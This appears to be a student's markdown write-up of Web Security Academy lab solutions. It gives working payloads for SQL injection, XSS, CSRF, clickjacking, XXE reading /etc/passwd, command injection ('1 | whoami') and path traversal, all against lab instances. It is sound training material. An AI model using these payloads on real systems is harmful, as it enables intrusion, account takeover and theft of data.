# 1. SQL injection
## Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
### Exploit
We can pass the following payload to the category input to retrieve hidden data `' OR 1=1 -- `

`GET /filter?category='+OR+1=1+--`

The executed SQL query will look like this:
```sql
SELECT * FROM products WHERE category = '' OR 1=1 -- ' AND released = 1
``` 
The `--` is used to comment out the rest of the query, so the `AND released = 1` is ignored.

<p align="center">
  <img src="/captures/01.01.png"><br/>
</p>


## Lab: SQL injection vulnerability allowing login bypass
### Exploit
We can pass the following payload to the username input to bypass the login `administrator'-- `
The executed SQL query will look like this:
```sql
SELECT * FROM users WHERE username = 'administrator'-- ' AND password = 'password'
```

<p align="center">
  <img src="/captures/01.02.01.png"><br/>
</p>

<p align="center">
  <img src="/captures/01.02.02.png"><br/>
</p>

# 2. Cross-site scripting
## Lab: Reflected XSS into HTML context with nothing encoded
### Exploit
We can pass the following payload to the search input to execute a reflected XSS attack `<script>alert(1)</script>`
The executed HTML will look like this:
```html
<div class="alert alert-warning">No products found</div>
<script>alert(1)</script>
```

<p align="center">
  <img src="/captures/02.01.png"><br/>
</p>

## Lab: Stored XSS into HTML context with nothing encoded
### Exploit
We can pass the following payload to the feedback input to execute a stored XSS attack `<script>alert(1)</script>`
The executed HTML will look like this:
```html
<div class="alert alert-success">Feedback submitted</div>
<script>alert(1)</script>
```
And the stored XSS will be executed when the feedback is viewed.

## Lab: DOM XSS in document.write sink using source location.search
### Vulnerability
The application uses the `document.write` method to output the value of the `q` parameter in the URL. This is a DOM-based XSS vulnerability: 
`document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');`
### Exploit
We can insert `"><script>alert(1)</script>` into the `q` parameter to execute a DOM-based XSS attack.

# 3. Cross-site request forgery
## Lab: CSRF vulnerability with no defenses | Web Security Academy
### Description
To solve the lab, we need to craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to our exploit server.

### Exploit
We create a form with email input, that will be sent to our url. Since no CSRF token is used, the form will be accepted and the email will be changed.

```html
<form 
  action="https://0a24008204f819cd824f38e600b7009b.web-security-academy.net/my-account/change-email" 
  method="POST"
>
  <input type="hidden" name="email" value="exploit@mail.com" />
</form>
<script>
  document.forms[0].submit();
</script>
```

<p align="center">
  <img src="/captures/03.01.01.png"><br/>
</p>
<p align="center">
  <img src="/captures/03.01.02.png"><br/>
</p>

# 4. Clickjacking
## Lab: Basic clickjacking with CSRF token protection
### Exploit
We create a page with an iframe that contains the target page and a button that the user is tricked into clicking.

```html
<head>
<style>
    iframe {
        position:relative;
        width:400px;
        height:700px; 
        opacity: 0.5;
        z-index: 2;
    }
    #decoy {
        position:absolute;
        top: 480px;
        left: 70px;
        width:300px;
        height:400px;
        z-index: 1;
    }
</style>
</head>
<body>
<div id="decoy">Test me</div>
<iframe src="https://0afa00bd0439d03c8145575d00210064.web-security-academy.net/my-account"></iframe>
</body>
```

<p align="center">
  <img src="/captures/04.01.png"><br/>
</p>

# 5. XXE
## Lab: Exploiting XXE using external entities to retrieve files
### Exploit
We can intercept the request and modify the XML to include an external entity that retrieves the contents of the `/etc/passwd` file.

```xml
<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE data [
        <!ELEMENT stockCheck ANY>
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <stockCheck>
        <productId>
            &xxe;
        </productId>
        <storeId>
            1
        </storeId>
    </stockCheck>
```
The response contains "Invalid product ID:" followed by the contents of the /etc/passwd file.

<p align="center">
  <img src="/captures/05.01.01.png"><br/>
</p>
<p align="center">
  <img src="/captures/05.01.02.png"><br/>
</p>

# 6. Command injection
## Lab: OS command injection, simple case
### Exploit
We can intercept and modify the storeID parameter in the POST request, giving it the value `1 | whoami` to execute the command `whoami`. The executed command will look like this:
```bash
stockCheck 1 | whoami
```
The response will contain the output of the `whoami` command: "peter-jXF8u5"

<p align="center">
  <img src="/captures/06.01.png"><br/>
</p>


# 7. Path Traversal
## Lab: File path traversal, simple case
### Exploit
We can intercept and modify the filename parameter in the GET request, giving it the value `../../../etc/passwd` to retrieve the contents of the /etc/passwd file.

<p align="center">
  <img src="/captures/07.01.png"><br/>
</p>


# 8. Access control and privilege escalation
## Lab: Unprotected admin functionality
### Exploit
We can check the robots.txt file to find the admin page. It contains the admin page route `/administrator-panel`. We can access it and voila, we have admin access.

<p align="center">
  <img src="/captures/08.01.01.png"><br/>
</p>

<p align="center">
  <img src="/captures/08.01.02.png"><br/>
</p>

# 9. Broken Authentication
## Lab: Password reset broken logic
### Exploit
We can repeat the request to change password and modify the username in the POST request  of the account we want to reset the password for. The victim account will have the password reset to the attacker's password.

<p align="center">
  <img src="/captures/09.01.01.png"><br/>
</p>

<p align="center">
  <img src="/captures/09.01.02.png"><br/>
</p>

# 10. Information disclosure
## Lab: Information disclosure in error messages
### Exploit
When opening a product that does not exist, the application returns an error message that contains the stack trace. The stack trace contains information which can be used to find the source code of the application and other sensitive information (vunerable libraries, etc).

<p align="center">
  <img src="/captures/10.01.png"><br/>
</p>